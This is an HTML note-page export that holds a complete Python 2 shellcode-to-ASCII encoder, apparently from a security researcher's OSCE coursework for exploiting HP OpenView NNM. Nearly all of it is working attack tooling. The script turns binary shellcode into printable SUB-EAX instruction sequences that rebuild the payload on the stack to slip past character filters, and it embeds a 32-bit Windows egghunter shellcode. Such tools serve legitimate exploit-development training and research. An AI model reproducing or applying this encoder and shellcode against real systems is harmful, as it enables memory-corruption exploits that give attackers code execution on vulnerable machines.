<!doctype html><html>
<head>
  <meta http-equiv="content-type" content="text/html; charset=utf-8">
  <title>Script</title>
  <meta name="generator" content="CherryTree">
  <link rel="stylesheet" href="res/styles3.css" type="text/css" />
  
    <script type="text/javascript">
        function in_frame () { try { return window.self !== window.top; } catch (e) { return true; } }
        if (!in_frame()) {
            var page = location.pathname.substring(location.pathname.lastIndexOf("/") + 1);
            window.location = 'index.html#' + page;
        }
    </script>
</head>
<body><div class="page"><h1 class="title">Script</h1><br/>#!/usr/bin/python<br />#<br /># Shellcode to ASCII encoder leveraging rebuilding on-the-stack technique,<br /># and using Jon Erickson's algorithm from Phiral Research Labs `Dissembler` <br /># utility (as described in: Hacking - The Art of Exploitation).<br />#<br /># Basically one gives to the program's output a binary encoded shellcode,<br /># and it yields on the output it's ASCII encoded form.<br />#<br /># This payload will at the beginning align the stack by firstly moving <br /># ESP value to the EAX, then by adding to the EAX value 0x16CA then by<br /># setting ESP with such resulted EAX. It means that the final decoded shellcode<br /># will get stored in the stack, by 0x16CA bytes away from current stack address.<br />#<br /># Obviously, this encoder will not be working under DEP/W^X environments.<br />#<br /># Written for HP OpenView NNM exploitation purpose, during <br /># Offensive-Security CTP / OSCE course.<br />#<br /># Source:<br />#   <a href="https://gist.github.com/mgeeky/8a118c69312b35a9db7f19f61c7a6b3c">https://gist.github.com/mgeeky/8a118c69312b35a9db7f19f61c7a6b3c</a><br />#<br /># Mariusz B. / mgeeky, '17<br />#<br /><br />import random<br />import struct<br />import ctypes<br />import sys<br /><br /># ================================================<br />#    OPTIONS<br /># ================================================<br /><br /># Characters that are safe to use in encoded payload.<br /># VALID_CHARS = "01234567890abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ-*\\%"<br /><strong><span style="color:#0000ff;">VALID_CHARS = "\x01\x02\x03\x04\x05\x06\x07\x08\x09\x2a\x25\x2d\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3b\x3c\x3d\x3e\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f\x50\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f\x60\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f"</span></strong><br /><br /># Be more verbose.<br />DEBUG = False<br /><br /># Set it to True in order to always prepend ZERO-EAX primitive before<br /># sequence of SUB operations. The `gen` routine will then operate on <br /># previous value being always 0x00000000 instead of previously held in <br /># EAX value. The side effect of this setting is increased payload length.<br />PREPEND_ZERO_OUT = False<br /><br />PREPEND_INIT = False<br /><br /># ================================================<br /><br />MAX_NUM = 128<br /><br />primitives = {<br />    # Zeros-out the EAX register<br />    # 25 4a4f4e45   AND EAX,454e4f4a<br />    # 25 3530313a   AND EAX,3a313035<br />    #'zero-eax' : '%JONE%501:',<br /><br />    # Zeros-out the EAX register<br />    # 25 4A4D4E55 AND EAX,554E4D4A<br />    # 25 3532312A AND EAX,2A313235<br />    'zero-eax': '%JMNU%521*',<br /><br />    # Aligns a stack address that the EAX will take, by <br />    # adding value of 0x1688 to the EAX register<br />    # 2D 41373737   SUB EAX, 37373741<br />    # 2D 69252525   SUB EAX, 25252569<br />    # 2D 72324949   SUB EAX, 49493272<br />    # 2D 5C5A5A5A   SUB EAX, 5A5A5A5C<br />    'eax-stack-align' : '-A777-i%%%-r2II-\\ZZZ',<br /><br />    # Sets ESP (stack pointer) to EAX<br />    # 50            PUSH EAX<br />    # 5c            POP ESP<br />    'set-esp-to-eax' : 'P\\',<br /><br />    # Sets EAX to ESP<br />    # 54            PUSH ESP<br />    # 58            POP EAX<br />    'set-eax-to-esp' : 'TX',<br /><br />    # ASCII friendly NOP equivalent<br />    # 47            INC EDI<br />    'nop' : 'G',<br /><br />    # Stores resulted EAX value on the stack<br />    # 50            PUSH EAX<br />    'store-on-stack' : 'P',<br />}<br /><br />class InvalidCharResulted(Exception):<br />    pass<br /><br />def dbg(x, raw = False):<br />    if DEBUG:<br />        if raw:<br />            print x<br />        else:<br />            print '[dbg] ' + x<br /><br />def compose(num):<br />    ret = 0<br />    ret |= num[3] &lt;&lt; 24<br />    ret |= num[2] &lt;&lt; 16<br />    ret |= num[1] &lt;&lt;  8<br />    ret |= num[0]<br />    return ret<br /><br />def decompose(num):<br />    decompose = [0, 0, 0, 0]<br />    decompose[0] = (num &amp; 0x000000ff)<br />    decompose[1] = (num &amp; 0x0000ff00) &gt;&gt; 8<br />    decompose[2] = (num &amp; 0x00ff0000) &gt;&gt; 16<br />    decompose[3] = (num &amp; 0xff000000) &gt;&gt; 24<br />    return decompose<br /><br />def strfry(item):<br />    return ''.join([str(w) for w in random.sample(item, len(item))])<br /><br />def strfrylist(item):<br />    x = list(item)<br />    random.shuffle(x)<br />    return x<br /><br /># Original algorithm designed by Jon Erickson, &lt;matrix@phiral.com&gt;<br /># Heavily modified by the author of this program.<br />def gen(dword, prev, alphabet):<br />    chrs_len = len(alphabet)<br /><br />    t = decompose(dword)<br />    l = decompose(prev)<br /><br />    p = [0 for i in range(MAX_NUM)]<br />    q = [0 for i in range(MAX_NUM)]<br />    r = [0 for i in range(MAX_NUM)]<br />    s = [0 for i in range(MAX_NUM)]<br /><br />    # Initializing index tables<br />    for a in range(chrs_len):<br />        p[a] = q[a] = r[a] = s[a] = a + 1 <br /><br />    # Shuffling index tables<br />    p = strfrylist(p)<br />    q = strfrylist(q)<br />    r = strfrylist(r)<br />    s = strfrylist(s)<br /><br />    #pr = strfrylist(list(alphabet[:20]))<br />    pr = [chr(0) for c in range(20)]<br /><br />    # Coefficients = subsequent bytes forming a DWORDs that will be<br />    # used as arguments in SUB operations. coeffs[0] stands for the <br />    # first SUB's argument, coeffs[1] for the second SUB's argument and so on.<br />    coeffs = [<br />        [0, 0, 0, 0],<br />        [0, 0, 0, 0],<br />        [0, 0, 0, 0],<br />        [0, 0, 0, 0]<br />    ]<br /><br />    # 0x2D - SUB opcode. Here we construct a template:<br />    #   [ ..., 0x2d, AA, BB, CC, DD, ...] where AA,BB,CC,DD will be argument<br />    # bytes to fill in.<br />    pr[0] = pr[5] = pr[10] = pr[15] = chr(0x2D)<br /><br />    # Construct from 1 to 5 at max consecutive SUB operations<br />    for a in range(1, 5):<br />        carry = 0<br />        flag = [0, 0, 0, 0]<br /><br />        # Iterate over bytes 0...3 composing full 32-bit DWORD<br />        for z in range(4):<br />            loop_next = 0<br /><br />            # Iterate over possible indexes of the first byte within argument<br />            for i in range(chrs_len):<br /><br />                # Iterate over possible indexes of the second byte within argument<br />                for j in range(chrs_len):<br />                    for k in range(chrs_len):<br />                        for m in range(chrs_len):<br /><br />                            # We get random byte from valid chars charset at currently <br />                            # processed positions.<br />                            x1 = alphabet[p[i] - 1]<br />                            x2 = alphabet[q[j] - 1]<br />                            x3 = alphabet[r[k] - 1]<br />                            x4 = alphabet[s[m] - 1]<br /><br />                            # t[z] - Desired[z], the target byte we are looking for<br />                            # l[z] - Previous[z], the previous byte on this position.<br />                            # Desired[z] = Previous[z] - Carry - A[z] - B[z] - C[z] - D[z]<br />                            # Previous[z] = Desired[z] + Carry + A[z] + B[z] + C[z] + D[z]<br />                            tr = ctypes.c_uint32( t[z] + carry \<br />                                        + ord(x1) + ord(x2) \<br />                                        + ord(x3) + ord(x4)).value<br /><br />                            # If sum result equals to our previous byte at this position -<br />                            # we have a hit.<br />                            if (tr &amp; 0xff) == l[z]:<br /><br />                                # Resulted value, in `tr` might be easily something like: 0x175<br />                                # then the carry will be 0x01<br />                                carry = (tr &amp; 0xff00) &gt;&gt; 8<br /><br />                                # We hit bytes forming a good looking DWORD (32 bit value), therefore<br />                                # we store that value for later considerations<br />                                if i &lt; chrs_len: <br />                                    pr[ 1 + z] = x1<br />                                    coeffs[0][z] = ord(x1)<br />                                if j &lt; chrs_len:<br />                                    pr[ 6 + z] = x2<br />                                    coeffs[1][z] = ord(x2)<br />                                if k &lt; chrs_len: <br />                                    pr[11 + z] = x3<br />                                    coeffs[2][z] = ord(x3)<br />                                if m &lt; chrs_len: <br />                                    pr[16 + z] = x4<br />                                    coeffs[3][z] = ord(x4)<br /><br />                                dbg('try = %x, l[%d] = %x, t[%d] = %x, coeffs = %s' % \<br />                                    (tr, z, l[z], z, t[z], str(coeffs)))<br /><br />                                loop_next = 1<br /><br />                                # We mark that we have already found a good values for that `z` position.<br />                                flag[z] = 1<br /><br />                            if a &lt; 4 or loop_next: break<br />                        if a &lt; 3 or loop_next: break<br />                    if a &lt; 2 or loop_next: break<br /><br />        # Have we found already all 4 byte candidates?<br />        if sum(flag) == 4:<br />            dbg('flag=%s, a=%d, z=%d, i=%d, j=%d, k=%d, m=%d' % (flag,a,z,i,j,k,m))<br />            break<br /><br />    assert sum(flag) == 4, "Could not generate computation instructions for this dword: 0x%08x" % dword<br /><br />    dbg('Coeffs before fixups = %s' % (str(coeffs)))<br /><br />    # Now we need to check whether the above algorithm did not fell into local optimum<br />    # and didn't yielded some slightly varying values. We will retry 5 times values fixups.<br />    ctr = 0<br />    while ctr &lt; 5:<br />        ctr += 1<br />        dbg('Fixup attempt %d: gen(0x%08x, 0x%08x, ...): "%s"' % \<br />            (ctr, dword, prev, ''.join(['%02x' % ord(c) for c in pr])))<br /><br />        # Now we print assembler interpretation of collected coefficients<br />        val = prev<br />        dbg('\n\t\t\t\t; EAX = 0x%08x' % val, True)<br />        for n in coeffs:<br />            num = compose(n)<br />            val = ctypes.c_uint32(val - num).value<br />            dbg('\tSUB EAX, 0x%08x\t; EAX = 0x%08x' % (num, val), True)<br /><br />        # oops, the resutled from substraction value is not matching desired one.<br />        # we will have to fixup bytes that differ and retry verification process.<br />        if val != dword:<br />            dbg('in attempt #%d values do not match: 0x%08x != 0x%08x' % (ctr,val,dword))<br /><br />            valdec = decompose(ctypes.c_uint32(val).value )<br />            dworddec = decompose(ctypes.c_uint32(dword).value)<br /><br />            # We check each of the four bytes whether they differ from desired.<br />            for i in range(4):<br />                if valdec[i] != dworddec[i]:<br />                    dbg('byte %d needs fixing %02x =&gt; %02x' % (i, valdec[i], dworddec[i]))<br />                    <br />                    # Since they differ, we fixup them<br />                    diff = valdec[i] - dworddec[i]<br />                    pr[16 + i] = chr(ord(pr[16 + i]) + diff)<br />                    coeffs[3][i] += diff<br /><br />                    # Resulted byte after applied fixup outlies our VALID_CHARS charset,<br />                    # we could have re-invoke the gen() routine here, but it will be easier<br />                    # to just quit and try again from the scratch.<br />                    if pr[16 + i] not in VALID_CHARS:<br />                        raise InvalidCharResulted(pr[16+i])<br /><br />        else:<br />            dbg('Values match perfectly: 0x%08x == 0x%08x' % (val, dword))<br />            break<br /><br />    if val != dword:<br />        print '\n[!] COMPUTATION FAILURE: 0x%08x != 0x%08x' % (val, dword)<br />        sys.exit(-1)<br /><br />    ret = ''.join(pr)<br />    return ret<br /><br />def process(inp, prepend_init = PREPEND_INIT):<br />    size = len(inp)<br />    pad = 4 - (size % 4)<br />    if pad == 4: pad = 0<br />    alphabet = strfry(VALID_CHARS)<br /><br />    # Build up initial payload's stub<br />    out = ''<br /><br />    if prepend_init:<br />        out += primitives['zero-eax']<br />        out += primitives['set-eax-to-esp']<br />        out += primitives['eax-stack-align']<br />        out += primitives['set-esp-to-eax']<br /><br />        if not PREPEND_ZERO_OUT:<br />            out += primitives['zero-eax']<br /><br />    buf = inp + '\x90' * pad<br />    assert len(buf) % 4 == 0, "Working buffer must be divisble by 4!"<br /><br />    prev = 0<br /><br />    # Iterate over every next four bytes grouped values (DWORDs)<br />    for i in range(len(buf), 0, -4):<br />        dword = struct.unpack('&lt;I', buf[i-4:i])[0]<br />        alphabet = strfry(alphabet)<br />        instr = gen(dword, prev, alphabet)<br />        if PREPEND_ZERO_OUT:<br />            prev = 0<br />            out += primitives['zero-eax']<br />        else:<br />            prev = dword<br />        out += instr + primitives['store-on-stack']<br /><br />    <br />    return out<br /><br />def usage():<br />    print '''<br />    :: printable-shellcode.py - Utility generating a ASCII-printable shellcode<br />                                out of provided binary file (ASCII encoder).<br />        Mariusz B. / mgeeky, '17<br /><br />        Algorithm based on terrific `dissembler` tool by Phiral Research Labs,<br />        by Jon Erickson &lt;matrix@phiral.com&gt;<br /><br />Usage:<br />    printable-shellcode.py &lt;input-file|0xValue&gt; &lt;output-file&gt;<br /><br />Where:<br />    input-file      - input file containing shellcode, '-' for stdin or 'EGG' for <br />                        standard T00WT00W 32-bit windows egghunter<br />    0xValue         - single DWORD value, prepended with 0x to encode.<br />    output-file     - file to store result of ASCII encoding, or '-' for stdout<br />'''<br /><br />def display_output(out):<br />    print '[+] SHELLCODE ENCODED PROPERLY. Resulted length: %d bytes' % (len(out))<br />    print<br />    print '-' * 80<br />    print out<br />    print '-' * 80<br />    print<br />    print '[+] HEX FORM:' <br />    print ''.join(['%02x' % ord(c) for c in out])<br />    print<br />    print '[+] ESCAPED-HEX FORM:' <br />    print ''.join(['\\x%02x' % ord(c) for c in out])<br />    print <br />    print '[+] PYTHON COMPACT SEXY FORM:'<br />    buf = '\tshellcode += r"'<br />    for i in range(len(out)):<br />        if i % 20 == 0 and i &gt; 0:<br />            buf += '"\n\tshellcode += r"'<br />        buf += out[i]<br />    buf += '"'<br />    print buf<br /><br />def primitives_precheck():<br />    failed = False<br />    for k, v in primitives.items():<br />        for c in v:<br />            if c not in VALID_CHARS:<br />                print '[!] ERROR: Primitive "%s" contains illegal character in it: (0x%02x, "%c")' % (k, ord(c), c)<br />                print '[!] It means you will have to find a suitable primitive yourself and modify the `primitives` dictionary within this script.'<br />                print<br />                failed = True<br /><br />    return not failed<br /><br />def main():<br />    if len(sys.argv) != 3:<br />        if len(sys.argv) == 2 and sys.argv[1].startswith('0x'):<br />            pass<br />        else:<br />            usage()<br />            return False<br /><br />    if not primitives_precheck():<br />        return False<br /><br />    input_bytes = []<br />    prepend_init = True<br /><br />    if sys.argv[1] == '-':<br />        input_bytes = sys.stdin.read()<br />    elif sys.argv[1].startswith('0x'):<br />        input_bytes = ''.join([chr(c) for c in decompose(int(sys.argv[1], 16))])<br />        prepend_init = False<br />    elif sys.argv[1] == 'EGG':<br />        input_bytes = "\x66\x81\xca\xff\x0f\x42\x52\x6a\x02\x58\xcd\x2e\x3c\x05\x5a\x74\xef\xb8\x54\x30\x30\x57\x8b\xfa\xaf\x75\xea\xaf\x75\xe7\xff\xe7"<br />    else:<br />        with open(sys.argv[1], 'rb') as f:<br />            input_bytes = f.read()<br /><br />    print '[*] Input buffer size: %d bytes.' % (len(input_bytes))<br /><br />    i = 0<br />    success = False<br />    while i &lt; 3:<br />        try:<br />            out = process(input_bytes, prepend_init)<br />            if out:<br />                success = True<br />                display_output(out)<br />                if len(sys.argv) &gt; 2 and sys.argv[2] != '-':<br />                    with open(sys.argv[2], 'wb') as f:<br />                        f.write(out)<br />            else:<br />                print '[?] Returned empty payload. Confused...'<br /><br />            break<br />        except InvalidCharResulted as pr:<br />            print '[!] Inter-bytes difference resulted too big rendering invalid char (%x, "%c"). Restarting...' % (ord(str(pr)), str(pr))<br />            continue<br /><br />    if not success:<br />        print '[!] PROGRAM FAILURE.'<br /><br />if __name__ == '__main__':<br />    main()<br /></div></body></html>